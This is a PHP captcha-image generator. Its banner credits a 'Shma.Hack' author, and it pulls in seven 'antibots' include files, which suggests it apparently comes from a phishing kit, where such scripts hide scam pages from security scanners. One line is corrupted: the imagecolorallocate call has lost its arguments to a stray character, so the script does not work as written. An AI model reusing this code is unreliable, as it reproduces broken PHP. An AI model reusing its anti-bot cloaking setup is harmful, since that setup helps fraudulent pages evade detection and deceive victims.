<?php
/*   
  /$$$$$$  /$$                              
 /$$__  $$| $$                              
| $$  \__/| $$$$$$$  /$$$$$$/$$$$   /$$$$$$ 
|  $$$$$$ | $$__  $$| $$_  $$_  $$ |____  $$
 \____  $$| $$  \ $$| $$ \ $$ \ $$  /$$$$$$$
 /$$  \ $$| $$  | $$| $$ | $$ | $$ /$$__  $$
|  $$$$$$/| $$  | $$| $$ | $$ | $$|  $$$$$$$
\______/ |__/  |__/|__/ |__/ |__/ \_______/


               ###################Contact#####################
               #               Captcher Ver.3                #
               #               Edit By Shma                  #
               #               fb:fb.com/Shma.Hack           #
			   ###############################################
*/
session_start();
error_reporting(0);
//------------------------------------------|| ANTIBOTS DZEB ||-----------------------------------------------------//
include "./BOTS/antibots1.php";
include "./BOTS/antibots2.php";
include "./BOTS/antibots3.php";
include "./BOTS/antibots4.php";
include "./BOTS/antibots5.php";
include "./BOTS/antibots6.php";
include "./BOTS/xBananaBotsPerfect.php";
// set content type
header("Content-Type: image/png");
// generate random text
$text = rand(1000,100000);
// set session to compare later
$_SESSION['captcha'] = $text;
// create an image resource from background...
$img = imagecreatefromjpeg("img/bg.jpg");
// refer to font file
$font = "fonts/arial.ttf";
// create random color for text
$R = rand(0,100);
$G = rand(0,100);
$B = rand(0,100);
// declare color resource
$TxtColor = imagecolorallocate(�7);
// add text to picture (with random tilting)
imagettftext($img,rand(40,45),rand(0,1),rand(10,70),rand(38,50),$TxtColor,$font,$text);
imagepng($img);
imagedestroy($img);
?>